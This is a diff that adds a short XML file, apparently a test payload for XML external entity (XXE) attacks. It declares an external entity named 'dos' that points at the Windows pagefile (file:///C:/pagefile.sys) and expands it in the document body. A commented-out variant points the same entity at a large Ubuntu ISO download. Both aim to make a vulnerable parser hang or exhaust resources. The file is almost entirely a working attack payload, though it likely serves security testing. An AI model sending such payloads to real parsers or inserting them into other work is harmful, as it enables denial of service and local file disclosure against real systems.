@@ -1,0 +1,13 @@
+<?xml version='1.0'?>
+<!DOCTYPE data [
+
+<!ENTITY dos SYSTEM "file:///C:/pagefile.sys" >
+
+]>
+<data>&dos;</data>
+<!--
+<!ENTITY dos SYSTEM "http://releases.ubuntu.com/14.04.3/ubuntu-14.04.3-desktop-amd64.iso" >
+//-->
+
+
+
